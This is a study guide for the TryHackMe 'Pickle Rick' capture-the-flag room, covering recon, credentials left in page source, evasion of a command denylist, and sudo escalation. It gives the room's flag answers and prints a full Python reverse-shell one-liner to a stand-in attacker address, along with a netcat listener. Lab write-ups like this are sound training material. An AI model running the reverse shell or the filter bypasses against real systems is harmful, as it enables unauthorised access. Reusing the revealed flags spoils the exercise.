# 📘 TryHackMe: Pickle Rick - Ultimate Master Guide & Flag-by-Flag Technical Breakdown

**Source Video:** [John Hammond - TryHackMe! PickleRick - BYPASSING Denylists](https://youtu.be/oCAtfcr3iUw)  
**Target Room:** Pickle Rick (TryHackMe)  
**Category:** Web Exploitation / Command Injection / Security Control Evasion / Privilege Escalation  

---

## ❓ What is a "Flag" in CTF / TryHackMe?
In Cyber Security & CTF (Capture The Flag) challenges, a **"Flag"** is a secret text string (e.g., `mr. meeseek hair`, `THM{...}`) placed inside a target machine. It acts as proof that you successfully exploited a vulnerability and gained access to a specific level or privilege (like user or root).

---

## 🚀 1. Reconnaissance & Enumeration (Scanning & Finding Entry Points)

---

### 1.1 Port Scanning: `nmap`
```bash
nmap -sC -sV -oN scan.txt <TARGET_IP>
```

#### 🔍 Command & Flag Breakdown:
- **`nmap`**: The Network Mapper tool used to discover active hosts, open ports, and running services.
- **`-sC`** *(Script Scan - Default)*:  
  Executes Nmap's default set of Lua scripts (**NSE - Nmap Scripting Engine**).  
  *Why use it?* It automatically checks for common web vulnerabilities, HTTP page titles, SSL certificate details, and SSH server keys without writing custom scripts.
- **`-sV`** *(Service Version Detection)*:  
  Probes open ports to determine what software version is running (e.g., `Apache httpd 2.4.18`, `OpenSSH 7.2p2`).  
  *Why use it?* Outdated software version numbers can be searched in databases like Exploit-DB or CVE Details to find ready-made exploits.
- **`-oN scan.txt`** *(Output Normal)*:  
  Saves the scan output to a plain text file named `scan.txt`.  
  *Why use it?* Saves scan results on disk so you don't have to re-scan the target machine later.
- **`<TARGET_IP>`**: The IP address of the target machine assigned by TryHackMe (e.g., `10.10.x.x`).

---

### 1.2 Directory & File Fuzzing: `gobuster`
```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

#### 🔍 Command & Flag Breakdown:
- **`gobuster`**: A high-speed directory and file brute-forcing tool written in Go.
- **`dir`** *(Directory Mode)*: Tells Gobuster to perform Directory and File enumeration (rather than DNS or Vhost fuzzing).
- **`-u http://<TARGET_IP>/`** *(URL)*: Specifies the target URL to test.
- **`-w /usr/share/wordlists/dirb/common.txt`** *(Wordlist)*:  
  Specifies the wordlist file containing thousands of common file and folder names.
- **`-x php,txt,html`** *(Extensions)*:  
  Tells Gobuster to append specified file extensions to every word in the wordlist.  
  *Why use it?* If the wordlist has `login`, Gobuster tests `login`, `login.php`, `login.txt`, and `login.html`. Web applications frequently use `.php` scripts and `.txt` notes.

---

### 1.3 Page Source Inspection & `robots.txt`
- **Inspecting HTML Source (`CTRL + U`):** Developers often leave HTML comments in web pages. Checking source code revealed:
  ```html
  <!-- Note to self: remember username! Username: RikW33d -->
  ```
- **Checking `robots.txt` (`http://<TARGET_IP>/robots.txt`):**  
  `robots.txt` instructs search engine crawlers (Googlebot) which paths NOT to index. Security researchers always inspect `robots.txt` because developers often hide sensitive administrative paths or secrets there.  
  *Result found:* `Wubbalubbadubdub` (Password).

---

## 🔓 2. Initial Access & Command Panel Exploration

1. Login at `http://<TARGET_IP>/login.php`:
   - **Username:** `RikW33d`
   - **Password:** `Wubbalubbadubdub`
2. Redirected to `portal.php` containing an input form to execute system commands.

---

### 2.1 Directory Listing: `ls -la`
```bash
ls -la
```

#### 🔍 Command & Flag Breakdown:
- **`ls`**: List directory contents.
- **`-l`** *(Long Listing Format)*: Displays file permissions (`-rw-r--r--`), file owner, group owner, file size in bytes, and last modification date.
- **`-a`** *(All Files)*: Lists ALL files, including hidden files that start with a dot (`.`).
- **`-la`**: Combines both long listing and hidden file discovery together.

---

## 🛡️ 3. Bypassing Web Application Denylists (Blacklists)

When executing `cat Sup3r_S3cuR3_P4ssw0rd.txt`, the application returns:
`Command disabled!`

### 💡 Why does `cat` fail?
The application developer wrote a **Denylist (Blacklist)** rule in PHP that checks if the string `"cat"` is present in the input. If matched, execution is blocked.

### 💡 Why Denylists Fail & How Every Bypass Works:

#### 1. `less Sup3r_S3cuR3_P4ssw0rd.txt`
- **`less`**: A terminal pager utility used to view file contents one page at a time. It opens the file directly without using `cat`.
- *Result:* Retrieves **Ingredient 1:** `mr. meeseek hair`.

#### 2. `head -n 100 Sup3r_S3cuR3_P4ssw0rd.txt`
- **`head`**: Prints the beginning lines of a file.
- **`-n 100`** *(Number of Lines)*: Instructs `head` to output the first 100 lines of the file.

#### 3. `tail -n 100 Sup3r_S3cuR3_P4ssw0rd.txt`
- **`tail`**: Prints the ending lines of a file.
- **`-n 100`** *(Number of Lines)*: Instructs `tail` to output the last 100 lines of the file.

#### 4. `more Sup3r_S3cuR3_P4ssw0rd.txt`
- **`more`**: A legacy terminal pager utility that outputs text page-by-page.

#### 5. `grep -R . Sup3r_S3cuR3_P4ssw0rd.txt`
- **`grep`**: Global Regular Expression Print.
- **`-R`** *(Recursive)*: Searches directories recursively.
- **`.`** *(Regex Match Any)*: Matches every single character, printing out all lines in the file.

#### 6. `tac Sup3r_S3cuR3_P4ssw0rd.txt`
- **`tac`**: `cat` spelled backwards. Reads and outputs lines in reverse order (bottom-to-top).

#### 7. `nl Sup3r_S3cuR3_P4ssw0rd.txt`
- **`nl`** *(Number Lines)*: Reads the file and prepends line numbers to each line.

#### 8. `base64 Sup3r_S3cuR3_P4ssw0rd.txt | base64 -d`
- **`base64`**: Encodes the target file content into Base64 format.
- **`|`** *(Pipe Operator)*: Redirects the output of the left command as input to the right command.
- **`base64 -d`** *(`-d` = Decode)*: Decodes the Base64 output back into readable text.

#### 9. String Concatenation Bypass (`c""at` / `c''at` / `ct`)
- `c""at Sup3r_S3cuR3_P4ssw0rd.txt`: The bash shell evaluates `c""at` as `cat`, but the simple string filter checking for `"cat"` misses it because of the quotes.

---

### 🥈 Finding Ingredient 2:
```bash
less "/home/rick/second ingredient.txt"
```
*Note:* Quotes `""` are required around the file path because of spaces in the filename `second ingredient.txt`.  
*Result:* **Ingredient 2:** `1 jerry tear`.

---

## ⚡ 4. Privilege Escalation to Root

---

### 4.1 Checking Sudo Rights: `sudo -l`
```bash
sudo -l
```

#### 🔍 Command & Flag Breakdown:
- **`sudo`** *(SuperUser DO)*: Executes commands with superuser (root) privileges.
- **`-l`** *(List Privileges)*:  
  Lists the allowed and forbidden commands for the invoking user in `/etc/sudoers`.
- **Output:**
  ```text
  (ALL : ALL) NOPASSWD: ALL
  ```
  - **`(ALL : ALL)`**: The web user (`www-data`) can run commands as **ANY** user and **ANY** group.
  - **`NOPASSWD: ALL`**: The web user does **NOT** need to type a password to run `sudo` commands!

---

### 4.2 Retrieving Root Flag (Ingredient 3):
```bash
sudo less /root/3rd.txt
```
- **`sudo`**: Elevates execution to root.
- **`less`**: Bypasses restrictions to read `/root/3rd.txt`.
- *Result:* **Ingredient 3:** `fleeb juice`.

---

## 🐚 5. Reverse Shell & Listener Breakdown

---

### 5.1 Netcat Listener (Attacker Machine)
```bash
nc -lvnp 4444
```

#### 🔍 Command & Flag Breakdown:
- **`nc`** *(Netcat)*: Networking utility for reading and writing data across network connections.
- **`-l`** *(Listen)*: Tells Netcat to listen for incoming connections rather than initiating an outbound connection.
- **`-v`** *(Verbose)*: Prints detailed status information (e.g., connection IP and port).
- **`-n`** *(Numeric)*: Disables DNS name resolution. Speeds up connection and avoids leaking DNS queries.
- **`-p 4444`** *(Port)*: Specifies local TCP port `4444` to listen on.

---

### 5.2 Python Reverse Shell One-Liner (Target Machine)
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

#### 🔍 Code & Component Breakdown:
- **`python3`**: Runs Python 3 interpreter on target.
- **`-c`** *(Command)*: Executes inline Python code passed within single quotes.
- **`import socket,subprocess,os`**: Imports libraries for networking (`socket`), process execution (`subprocess`), and operating system file descriptors (`os`).
- **`s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)`**:  
  Creates a socket object `s` using IPv4 (`AF_INET`) and TCP (`SOCK_STREAM`).
- **`s.connect(("<ATTACKER_IP>",4444))`**: Connects back to the attacker machine on port 4444.
- **`os.dup2(s.fileno(), 0)`**: Redirects Standard Input (`stdin` = 0) to the socket stream.
- **`os.dup2(s.fileno(), 1)`**: Redirects Standard Output (`stdout` = 1) to the socket stream.
- **`os.dup2(s.fileno(), 2)`**: Redirects Standard Error (`stderr` = 2) to the socket stream.
- **`subprocess.call(["/bin/bash", "-i"])`**:  
  Spawns an interactive (`-i`) Bash shell connected to the socket stream.

---

## 📌 Final Summary Table

| Step | Command | Flags Used & Purpose | Value / Result |
| :--- | :--- | :--- | :--- |
| **Port Scan** | `nmap -sC -sV -oN scan.txt <IP>` | `-sC` (default scripts), `-sV` (version), `-oN` (save text) | Ports 22 & 80 open |
| **Web Fuzzing** | `gobuster dir -u <URL> -w <LIST> -x php,txt` | `dir` (directory mode), `-u` (url), `-w` (wordlist), `-x` (exts) | `/login.php`, `/robots.txt` |
| **Directory List**| `ls -la` | `-l` (long format), `-a` (hidden files) | Shows files & hidden items |
| **Ingredient 1** | `less Sup3r_S3cuR3_P4ssw0rd.txt` | `less` (pager to bypass `cat` denylist) | `mr. meeseek hair` |
| **Ingredient 2** | `less "/home/rick/second ingredient.txt"` | `""` (quote path for spaces) | `1 jerry tear` |
| **Sudo Check** | `sudo -l` | `-l` (list sudo permissions) | `NOPASSWD: ALL` |
| **Ingredient 3** | `sudo less /root/3rd.txt` | `sudo` (root execution), `less` (reader) | `fleeb juice` |
| **Netcat Listener**| `nc -lvnp 4444` | `-l` (listen), `-v` (verbose), `-n` (numeric IP), `-p` (port) | Catches reverse shell |
